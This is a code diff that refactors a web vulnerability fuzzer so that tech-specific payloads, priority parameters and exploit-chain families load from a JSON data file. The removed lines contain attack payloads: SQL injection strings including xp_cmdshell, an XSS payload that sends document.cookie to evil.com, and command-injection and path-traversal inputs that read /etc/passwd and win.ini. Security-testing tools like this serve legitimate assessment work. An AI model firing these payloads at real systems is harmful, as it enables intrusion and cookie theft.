@@ -49,6 +49,22 @@ WAF_SIGNATURES = _fuzzer_data.get("WAF_SIGNATURES", {})
 CHAIN_RULES = _fuzzer_data.get("CHAIN_RULES", {})
 CHAIN_PAYLOADS = _fuzzer_data.get("CHAIN_PAYLOADS", {})
 PARAM_TYPE_MAP: dict[str, list[str]] = _fuzzer_data.get("PARAM_TYPE_MAP", {})
+# Tech-stack → extra payloads, data-driven (no hardcoded tech branches in code).
+# Shape: {vuln_type: {tech_token: [payloads]}}; tech_token matches a detected
+# technology name (exact) or as a substring of the joined tech string.
+TECH_PAYLOAD_AUGMENTS: dict[str, dict[str, list[str]]] = _fuzzer_data.get(
+    "TECH_PAYLOAD_AUGMENTS", {}
+)
+# URL-context → priority parameter names, data-driven and ordered (first match
+# wins). No hardcoded url-keyword branches in code.
+PRIORITY_PARAM_HINTS: list[dict[str, list[str]]] = _fuzzer_data.get(
+    "PRIORITY_PARAM_HINTS", []
+)
+# Vuln-family → extra follow-on chain steps, data-driven (no hardcoded family
+# membership in code). Each entry: {"members": [...], "follow_ons": [...]}.
+CHAIN_FAMILY_FOLLOWONS: list[dict[str, list[str]]] = _fuzzer_data.get(
+    "CHAIN_FAMILY_FOLLOWONS", []
+)
 
 _SEVERITY_ORDER: list[str] = _fuzzer_data.get(
     "_SEVERITY_ORDER",
@@ -748,39 +764,16 @@ class Fuzzer:
 
         payloads = list(base_payloads)  # Start with base payloads
 
-        # Tech-specific payload augmentation
+        # Tech-specific payload augmentation — fully data-driven. The vuln_type →
+        # tech_token → payloads mapping lives in fuzzer_data.json
+        # (TECH_PAYLOAD_AUGMENTS); no per-tech branches are hardcoded here, so new
+        # stacks/payloads are added by editing data, not code.
         tech_names = [t.name.lower() for t in target_profile.technologies]
-
-        if vuln_type == "sql_injection":
-            if "mysql" in tech_names:
-                payloads.extend(["' OR 1=1-- ", "UNION SELECT NULL-- ", "WAITFOR DELAY '0:0:5'-- "])
-            elif "postgresql" in tech_names:
-                payloads.extend(["' OR 1=1-- ", "UNION SELECT NULL-- ", "pg_sleep(5)-- "])
-            elif "mssql" in tech_names or "sql server" in " ".join(tech_names):
-                payloads.extend(["' OR 1=1-- ", "UNION SELECT NULL-- ", "; EXEC xp_cmdshell('id')-- "])
-
-        elif vuln_type == "xss":
-            tech_str = " ".join(tech_names)
-            if any(fw in tech_str for fw in ("django", "rails", "express")):
-                # Modern frameworks often have CSP, try bypass techniques
-                payloads.extend([
-                    "<script>fetch('https://evil.com/?c='+document.cookie)</script>",
-                    "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
-                ])
-
-        elif vuln_type == "command_injection":
-            tech_str = " ".join(tech_names)
-            if "windows" in tech_str or "iis" in tech_str:
-                payloads.extend(["& dir", "| type C:\\Windows\\win.ini", "&& whoami"])
-            elif "nginx" in tech_names or "apache" in tech_names:
-                payloads.extend(["; cat /etc/passwd", "| id", "&& uname -a"])
-
-        elif vuln_type == "path_traversal":
-            tech_str = " ".join(tech_names)
-            if "windows" in tech_str or "iis" in tech_str:
-                payloads.extend(["..\\..\\..\\..\\Windows\\win.ini", "%2e%2e%5c%2e%2e%5c"])
-            elif "nginx" in tech_names:
-                payloads.extend(["..%2f..%2f..%2fetc%2fpasswd", "....//....//etc/passwd"])
+        tech_str = " ".join(tech_names)
+        for tech_token, extra_payloads in TECH_PAYLOAD_AUGMENTS.get(vuln_type, {}).items():
+            token = str(tech_token).lower()
+            if token in tech_names or token in tech_str:
+                payloads.extend(extra_payloads)
 
         # Deduplicate while preserving order
         seen = set()
@@ -2279,20 +2272,13 @@ class ExpertHeuristics:
     def get_priority_parameters(url: str, method: str = "GET") -> list[str]:
         priority: list[str] = []
 
-        if "login" in url or "signin" in url:
-            priority.extend(["username", "password", "email", "token"])
-        elif "profile" in url or "user" in url:
-            priority.extend(["user_id", "id", "username", "email", "role"])
-        elif "admin" in url:
-            priority.extend(["id", "user_id", "action", "page"])
-        elif "search" in url or "query" in url:
-            priority.extend(["q", "query", "search", "keyword"])
-        elif "api" in url:
-            priority.extend(["api_key", "token", "id", "action"])
-        elif "file" in url or "download" in url or "upload" in url:
-            priority.extend(["file", "path", "filename", "name", "template"])
-        elif "pay" in url or "checkout" in url or "order" in url:
-            priority.extend(["price", "amount", "quantity", "coupon", "discount"])
+        # First matching context wins (preserves the original precedence). The
+        # url-keyword → params mapping is data-driven (PRIORITY_PARAM_HINTS in
+        # fuzzer_data.json), so contexts/params are tuned in data, not code.
+        for hint in PRIORITY_PARAM_HINTS:
+            if any(kw in url for kw in hint.get("url_keywords", [])):
+                priority.extend(hint.get("params", []))
+                break
 
         return list(dict.fromkeys(priority))
 
@@ -2543,15 +2529,6 @@ class ExploitChainEngine:
         self.discovered_chains: list[ExploitChain] = []
         self._special_probe_cache: dict[str, list[FuzzResult]] = {}
 
-    _INJECTION_FAMILY: frozenset[str] = frozenset({
-        "sql_injection", "xss", "ssti", "command_injection",
-        "xxe", "path_traversal", "code_injection", "template_injection",
-    })
-    _PROXY_FAMILY: frozenset[str] = frozenset({
-        "open_redirect", "ssrf", "graphql", "xss",
-        "http_smuggling", "cache_poisoning",
-    })
-
     async def discover_chains(
         self,
         initial_findings: list[FuzzResult],
@@ -2561,10 +2538,11 @@ class ExploitChainEngine:
         for finding in initial_findings:
             follow_ons = list(CHAIN_RULES.get(finding.vuln_type, []))
 
-            if finding.vuln_type in self._INJECTION_FAMILY:
-                follow_ons.append("second_order_injection")
-            if finding.vuln_type in self._PROXY_FAMILY:
-                follow_ons.append("http_desync_cache")
+            # Family-based follow-ons are data-driven (CHAIN_FAMILY_FOLLOWONS in
+            # fuzzer_data.json) — no hardcoded family membership in code.
+            for _fam in CHAIN_FAMILY_FOLLOWONS:
+                if finding.vuln_type in (_fam.get("members") or []):
+                    follow_ons.extend(_fam.get("follow_ons") or [])
             follow_ons = list(dict.fromkeys(follow_ons))
             if not follow_ons:
                 continue
